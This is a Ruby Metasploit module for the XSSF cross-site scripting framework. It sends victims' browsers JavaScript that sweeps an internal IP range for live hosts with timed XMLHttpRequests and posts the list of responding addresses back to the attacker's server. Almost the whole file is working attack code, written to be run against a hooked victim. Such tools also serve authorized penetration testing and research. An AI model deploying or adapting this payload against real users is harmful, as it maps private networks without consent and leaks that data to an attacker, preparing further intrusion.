require 'msf/core'
require 'xssf'

#
# READ README_XSSF FILE FOR MORE INFORMATION ABOUT MODULES
#
# This attack is using JS RECON (HTML5 based JavaScript Network Reconnaissance Tool)
# Visit http://www.andlabs.org/tools/jsrecon/jsrecon.html for more details
# JS RECON By "Attack & Defense Labs"
#
class Metasploit3 < Msf::Auxiliary
	include Msf::Xssf::XssfServer
	
	# Module initialization
	def initialize(info = {})
		super(update_info(info,
			'Name'        => 'Network Scanner',
			'Description' => 'Scans network for alive hosts',
			'Author' 	  => 'Attack & Defense Labs (Original Script)' 
		))
		
		register_options(
			[
				OptAddress.new('startIP', [true, 'Starting IP adress to scan ports', '10.100.42.230']),
				OptAddress.new('endIP', [true, 'Ending IP adress to scan ports', '10.100.42.240'])
			], self.class
		)
	end
	
	# Part sent to the victim, insert your code here !!!
	def on_request_uri(cli, req)
		code = %Q{
			var start_ip 	= #{datastore['startIP'].split('.')};
			var end_ip 		= #{datastore['endIP'].split('.')};

			var current_port	= 0;
			var current_ip		= [];
			var ns_hosts_up		= [];
			var closed_port_max	= 2000;
			var start_time;
			
			function scan_network_xhr()
			{
				if(init_ip_ns())
				{
					XSSF_POST("Live Hosts (from '#{datastore['startIP']}' to '#{datastore['endIP']}'):\\n" + ns_hosts_up.join(',\\n'), '#{self.name}');
					return;
				}
				start_time = (new Date).getTime();
				try
				{		
					XSSF_XHR.open('GET', "http://" + current_ip.join("."));
					XSSF_XHR.send();
					setTimeout("check_ns_xhr()", 100);
				}
				catch(err)
				{
					return;
				}
			}
			
			function check_ns_xhr()
			{
				var interval = (new Date).getTime() - start_time;
				if(XSSF_XHR.readyState == 1)
				{
					if(interval > closed_port_max)
						setTimeout("scan_network_xhr()", 1);
					else
						setTimeout("check_ns_xhr()", 100);
				}
				else
				{
					ns_hosts_up.push(current_ip.join("."));
					setTimeout("scan_network_xhr()", 1);
				}
			}
	
			function init_ip_ns()
			{
				if(current_ip.length == 0)
					current_ip = copy_ip(start_ip);
				else if(compare_ip(current_ip, end_ip) == 2)
					return true;
				else
					current_ip = increment_ip(current_ip);

				return false;
			}
			
			function copy_ip(source)
			{
				var dest = [];
				for(var i = 0; i < source.length; i++)
					dest[i] = source[i];

				return dest;
			}
			
			function compare_ip(a, b)
			{
				for(var i = 0; i < 4; i++)
				{
					var r = _compare_int(a[i], b[i]);
					if(r == 1)
						return 1; //a is greater than b
					else if(r == 3)
						return 3; //b is greater than a
				}
				return 2; //b is equal to a
			}
			
			function increment_ip(inc_ip)
			{
				inc_ip[3]++;
				for(var i = 3; i >= 0; i--)
				{
					if(inc_ip[i] == 255)
					{
						inc_ip[i] = 0;
						inc_ip[i-1]++;
					}
				}
				return inc_ip;
			}
			
			function _compare_int(_a,_b)
			{
				if(_a > _b)
					return 1; //_a is greater than _b
				else if(_a == _b)
					return 2; //_a is equal to _b
				else
					return 3; //_a is lesser than _b
			}
	
			setTimeout("scan_network_xhr()", 1);
		}

		send_response(cli, code)
	end
end